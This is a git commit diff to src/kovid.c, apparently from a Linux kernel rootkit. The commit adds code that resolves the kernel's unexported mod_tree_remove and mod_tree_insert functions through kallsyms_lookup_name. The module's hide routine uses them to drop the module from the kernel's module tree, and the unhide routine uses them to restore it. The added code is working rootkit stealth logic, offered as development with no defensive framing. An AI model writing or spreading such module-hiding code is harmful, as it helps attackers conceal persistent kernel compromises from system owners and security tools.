d2909757f13b9a0883c7e62caafeffb7e16257ab
ysfgalip <yusufkurt@protonmail.com>
2026-05-25 17:36:09 +0200

    add hiding from mod_tree

--- src/kovid.c
+++ src/kovid.c
@@ -238,6 +238,12 @@ static int _hide_mod(void)
 	// as long as we are "loading"...
 	lkmmod.this_mod->state = MODULE_STATE_UNFORMED;
 
+	// Remove module from mod_tree if CONFIG_MODULES_TREE_LOOKUP is enabled
+	struct kernel_syscalls *ks = kv_kall_load_addr();
+	void (*k_mod_tree_remove)(struct module *mod) = (void (*)(
+		struct module *))ks->k_kallsyms_lookup_name("mod_tree_remove");
+	k_mod_tree_remove(lkmmod.this_mod);
+
 	return 0;
 }
 
@@ -298,6 +304,13 @@ static int _unhide_mod(void)
 
 	list_add(&(lkmmod.this_mod->list), mod_list);
 	spin_unlock(&hiddenmod_spinlock);
+
+	// Restore mod_tree entry
+	struct kernel_syscalls *ks = kv_kall_load_addr();
+	void (*k_mod_tree_insert)(struct module *mod) = (void (*)(
+		struct module *))ks->k_kallsyms_lookup_name("mod_tree_insert");
+	k_mod_tree_insert(lkmmod.this_mod);
+
 	goto out_put_kobj;
 
 out_attrs:
